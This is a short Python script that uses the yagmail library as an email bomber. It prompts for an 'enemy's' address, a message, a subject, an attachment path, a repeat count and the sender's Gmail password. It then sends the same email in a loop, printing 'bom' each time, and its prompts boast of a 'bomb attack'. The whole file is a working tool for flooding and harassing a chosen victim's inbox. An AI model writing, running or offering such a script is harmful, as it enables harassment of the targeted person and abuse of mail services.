import yagmail
r=input("i m very disturtbing partical tell me ur enemies email id ")
z=0
msg=input("enter a nice body ")
sub=input("and subject also")
b=int(input("how many times shall i disturb tell me asap"))
f=input("enter your gmail email id now  ")
pwd=input("did u forget to gimme password so that i can give a nice bomb attack? tell me the pass else i wont be able to wrk tell me asap now fast ")
ata=input("enter file path to send    in windows right click a file and click on copy as path and remove quotes and paste it")
for i in range (0,b): 
    email=yagmail.SMTP(user=f,password=pwd)
    email.send(to=r,subject=sub,contents=msg,attachments=ata)
    print("bom ",i)